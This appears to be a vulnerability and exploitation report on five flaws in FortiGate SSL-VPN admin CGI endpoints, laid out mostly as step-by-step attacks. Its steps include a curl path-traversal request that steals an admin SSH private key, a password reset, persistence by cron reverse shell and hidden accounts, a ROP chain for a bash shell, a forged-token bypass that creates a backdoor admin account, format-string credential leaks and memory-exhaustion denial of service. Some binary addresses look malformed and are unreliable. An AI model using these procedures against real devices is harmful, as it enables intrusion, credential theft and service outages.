**1. PATH TRAVERSAL → RCE (CVSS 9.8 CRITICAL)**

ROOT CAUSE:
- Insufficient input validation in SSL-VPN file path handling (/admin/path.cgi)
- User-supplied paths not sanitized for ../ sequences
- Configuration files accessible with insufficient privilege separation

AFFECTED COMPONENT: /admin/path.cgi
AUTHENTICATION REQUIRED: No
NETWORK ACCESS: Yes

EXPLOITATION STEPS:
1. Access SSH private key of admin user:
   curl -s "http://192.168.1.50/admin/path.cgi?file=../../home/admin/.ssh/id_rsa"

2. Use harvested SSH key for authentication:
   chmod 600 harvested_key.pem
   ssh -i harvested_key.pem admin@192.168.1.50

3. Escalate to root privileges (sudoers misconfiguration):
   sudo /usr/local/bin/diag_cli
   config system admin
   set password COMPROMISED
   next
   end

4. Install persistence mechanisms:
   - SSH backdoor key in authorized_keys
   - Cron reverse shell job
   - Hidden account in /etc/passwd

EXPLOITATION TIMELINE: 15 minutes to full code execution
GLOBAL IMPACT: Estimated 50,000+ FortiGate appliances with SSL-VPN enabled

**2. BUFFER OVERFLOW (CVSS 8.6 CRITICAL)**

ROOT CAUSE:
- Stack-based buffer allocated with fixed size (64 bytes)
- strcpy() function used without length validation
- Return address overwritable via buffer overflow

AFFECTED COMPONENT: /admin/hostname.cgi
VULNERABILITY TYPE: CWE-120 (Classic Buffer Overflow)

BINARY CODE PATH:
Base Address: 0x000000004000000
Function: process_hostname() @ 0x0000000040c8f20
  → Stack Frame Setup: allocate 64 bytes @ rbp-0x40
  → strcpy(hostname_buffer, user_input) @ 0x0000000040c8f50 [VULNERABLE]
  → Return pointer @ rbp+0x8 (OVERWRITABLE)

EXPLOITATION STEPS:
1. Identify buffer size via fuzzing:
   - Crash occurs at 72+ bytes (8 bytes overflow)

2. Locate ROP gadgets:
   - pop rdi; ret @ 0x000000004042a0a
   - pop rsi; ret @ 0x000000004042a0b
   - pop rdx; ret @ 0x000000004042a0d
   - syscall @ 0x0000000040d4567

3. Build ROP chain for execve("/bin/bash", ...):
   - Set rdi = bash_string_addr
   - Set rsi = bash_string_addr
   - Set rdx = 0
   - Call syscall (execve)

4. Overflow return address with ROP chain
5. Execute bash shell and establish reverse connection

EXPLOITATION TIMELINE: 20 minutes to shell access

**3. AUTHENTICATION BYPASS (CVSS 7.2 HIGH)**

ROOT CAUSE:
- Session token validation missing HMAC signature
- Token length validation flaw: if (len < 8) RETURN_VALID (BUG)
- No expiration timestamp verification

AFFECTED COMPONENT: /admin/index.cgi
VULNERABILITY TYPE: CWE-284 (Improper Access Control)

BINARY CODE PATH:
Function: validate_session() @ 0x0000000040e1a20
  → Check if token length < 8 bytes: if (len < 8) RETURN_VALID [VULNERABLE]
  → Missing: HMAC signature verification
  → Missing: Expiration time check

EXPLOITATION STEPS:
1. Create minimal valid token (single character):
   token = "x"
   encoded = base64_encode("x") = "eA=="

2. Set cookie and bypass authentication:
   Cookie: session_token=eA==
   GET /admin/panel.cgi → HTTP 200 OK [Admin access granted!]

3. Extract complete configuration:
   GET /admin/config.cgi (with forged token)
   → Response contains entire device configuration in XML format

4. Create persistent admin account:
   POST /admin/user.cgi
   -H "Cookie: session_token=eA=="
   -d "action=create&username=hacker&password=Backdoor123&role=admin"

5. Login with new admin account for permanent access

IMPACT: Complete bypass of authentication mechanism

**4. FORMAT STRING (CVSS 6.5 MEDIUM)**

ROOT CAUSE:
- User input directly used in printf() without sanitization
- printf(user_input) instead of printf("%s", user_input)
- Stack memory disclosure possible

AFFECTED COMPONENT: /admin/log.cgi
VULNERABILITY TYPE: CWE-134 (Use of Externally-Controlled Format String)

BINARY CODE PATH:
Function: format_log_entry() @ 0x0000000040f2d10
  → printf(user_input) @ 0x0000000040f2d40 [VULNERABLE!]

EXPLOITATION STEPS:
1. Detect format string vulnerability:
   curl "http://192.168.1.50/admin/log.cgi?msg=%x.%x.%x.%x.%x"
   → Output shows hexadecimal stack values (CONFIRMED)

2. Read stack memory:
   payload = "%p " * 20
   → Retrieve 20 values from stack with memory addresses

3. Leak sensitive information:
   - SSH private keys (from memory)
   - SSL certificates
   - Password hashes
   - Encryption keys
   - Session tokens

IMPACT: Disclosure of critical security credentials

**5. DENIAL OF SERVICE (CVSS 5.3 MEDIUM)**

ROOT CAUSE:
- No rate limiting on connection attempts
- Memory leak in connection structure allocation
- Connection tracking structures not freed on error
- Each connection consumes ~1 MB memory

AFFECTED COMPONENT: /admin/connect.cgi
VULNERABILITY TYPE: CWE-400 (Uncontrolled Resource Consumption)

BINARY CODE PATH:
Function: handle_connection() @ 0x0000000040a1f00
  → Allocate connection structure (NOT FREED on error)
  → No check: if (max_connections > limit) return_error
  → Each connection: +1 MB memory, no automatic cleanup

EXPLOITATION STEPS:
1. Open 5000+ concurrent connections:
   - No rate limiting detected
   - All connections accepted
   - Memory consumption grows: 7.8Gi → 7.9Gi → exhaustion

2. Monitor device memory:
   - Free memory decreases rapidly
   - After 3000 connections: only 200MB free
   - After 5000 connections: OOM Killer triggered

3. Service becomes unresponsive:
   - FortiOS management process crashes
   - Device may reboot
   - Management interface unreachable

IMPACT: Complete service unavailability for all users
